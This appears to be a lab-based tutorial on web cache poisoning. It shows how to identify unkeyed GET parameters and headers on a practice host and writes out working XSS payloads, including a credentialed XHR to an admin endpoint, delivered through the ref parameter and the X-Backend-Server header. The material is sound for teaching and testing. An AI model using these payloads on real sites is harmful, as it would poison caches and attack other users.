# Identifying Unkeyed Parameters

In a web cache poisoning attack, the goal is to force the web cache to serve malicious content to other users. To achieve this, it is essential to identify unkeyed parameters that can be used to inject a malicious payload into the response. The parameter used to deliver the payload must be unkeyed because if it were keyed, the victim would also have to send the malicious payload themselves, essentially resulting in a scenario similar to reflected XSS.

For example, consider a web application vulnerable to reflected XSS via the `ref` parameter, which also supports multiple languages through a `language` parameter. If the `ref` parameter is unkeyed while the `language` parameter is keyed, an attacker can deliver a payload using a URL like `/index.php?language=en&ref="><script>alert(1)</script>`. If the web cache stores this response, it becomes poisoned, meaning all subsequent users who request the resource `/index.php?language=en` will be served the XSS payload. If the `ref` parameter were keyed, the victim's request would result in a different cache key, and thus the web cache would not serve the poisoned response.

Therefore, the first step in identifying web cache poisoning vulnerabilities is to identify unkeyed parameters. Another crucial insight is that web cache poisoning, in most cases, primarily facilitates the exploitation of other vulnerabilities already present in the underlying web application, such as reflected XSS or Host header vulnerabilities. In some instances, however, web cache poisoning can transform un-exploitable issues in a default/plain web server setting into exploitable vulnerabilities.

Unkeyed request parameters can be identified by observing whether a cached or fresh response is served. As discussed previously, request parameters include the path, GET parameters, and HTTP headers. Determining whether a response was cached can be challenging. While some servers, like those in our lab, indicate this via an `X-Cache-Status` header, in a real-world scenario, this may not be available. Instead, you can manually test by changing parameters and carefully observing the response. For instance, if you change a parameter value and the response remains the same, it suggests that the parameter is unkeyed and the same cached response was served. Let's begin with a basic example to illustrate a simple cache poisoning scenario.

## Unkeyed GET Parameters

Consider a simple web application that displays text and allows users to embed their own content. The web application uses the GET parameter `language` and embeds user content via the `content` parameter. Let's investigate if either of these parameters is unkeyed.

First, send an initial request with only the `language` parameter. The first request will typically result in a cache miss, while subsequent identical requests will result in a cache hit (as indicated by the `X-Cache-Status` header).

```http
GET /index.php?language=en HTTP/1.1
Host: webcache.htb

HTTP/1.1 200 OK
X-Cache-Status: MISS
```

```http
GET /index.php?language=en HTTP/1.1
Host: webcache.htb

HTTP/1.1 200 OK
X-Cache-Status: HIT
```

If you then send a different value in the `language` parameter, and the response differs and results in a cache miss, this indicates that the `language` parameter is keyed.

```http
GET /index.php?language=de HTTP/1.1
Host: webcache.htb

HTTP/1.1 200 OK
X-Cache-Status: MISS
```

Applying the same logic to the `content` parameter, if a series of requests where only the `content` parameter changes (while `language` remains constant) consistently results in cache misses for new content values, then the `content` parameter is also keyed. However, if changing the `content` parameter results in a cache hit (while `language` remains constant), it indicates that the `content` parameter is unkeyed.

A common scenario for finding unkeyed parameters is when navigating through an application. For instance, attempting to access an admin panel and then using a "go back" link might set a third parameter, such as `ref`. If testing this `ref` parameter shows that changing its value still results in cache hits (while other keyed parameters remain constant), then `ref` is an unkeyed parameter.

**Note:** In a real-world engagement with a highly trafficked site, it's difficult to distinguish between a cache hit due to an unkeyed parameter and a cache hit due to another user's request. Therefore, always use **Cache Busters** in real-world scenarios, which will be discussed later.

To determine if an unkeyed parameter like `ref` is exploitable, you need to see how its value influences the response content. If its value is reflected in the submission form without sanitization, it can be used for reflected XSS:

```http
GET /index.php?language=test&ref=HelloWorld HTTP/1.1
Host: webcache.htb

HTTP/1.1 200 OK

<form>
  <input type="hidden" name="language" value="test">
  <input type="hidden" name="ref" value="HelloWorld">
  <input type="submit" value="Submit">
</form>
```

If no sanitization is applied, you can break out of the HTML element and trigger a reflected XSS:

```http
GET /index.php?language=unusedvalue&ref="><script>alert(1)</script> HTTP/1.1
Host: webcache.htb
```

This allows you to poison the cache for any user who browses the page in your targeted language. The goal might be to force an admin user to reveal sensitive information by requesting an admin-only endpoint. This can be achieved with a JavaScript payload similar to:

```js
<script>var xhr=new XMLHttpRequest();xhr.open('GET','/admin.php?reveal_flag=1',true);xhr.withCredentials=true;xhr.send();</script>
```

This results in a cache poisoning request where the `language` parameter is set (e.g., `de`) and the `ref` parameter contains the URL-encoded XSS payload:

```http
GET /index.php?language=de&ref=%22%3E%3Cscript%3Evar%20xhr%20=%20new%20XMLHttpRequest();xhr.open(%27GET%27,%20%27/admin.php?reveal_flag=1%27,%20true);xhr.withCredentials%20=%20true;xhr.send();%3C/script%3E HTTP/1.1
Host: webcache.htb
```

After poisoning the cache and waiting for the admin to visit the site, the XSS payload will be triggered, potentially revealing the desired information.

## Unkeyed Headers

Similar to unkeyed GET parameters, it is common to find unkeyed HTTP headers that influence the response of the web server. For example, a custom HTTP header like `X-Backend-Server`, which might be a leftover debug header, could influence the location from which a debug script is loaded:

```http
GET /index.php?language=en HTTP/1.1
Host: webcache.htb
X-Backend-Server: testserver.htb

HTTP/1.1 200 OK

<script src="http://testserver.htb/debug/js/debug.js"></script>
```

The same methodology can be applied to determine that this header is unkeyed. Since this header is reflected without sanitization, it can also be used to exploit an XSS vulnerability. Thus, the header can deliver the same payload as before with a request like:

```http
GET /index.php?language=de HTTP/1.1
Host: webcache.htb
X-Backend-Server: testserver.htb"></script><script>var xhr=new XMLHttpRequest();xhr.open('GET','/admin.php?reveal_flag=1',true);xhr.withCredentials=true;xhr.send();//
```

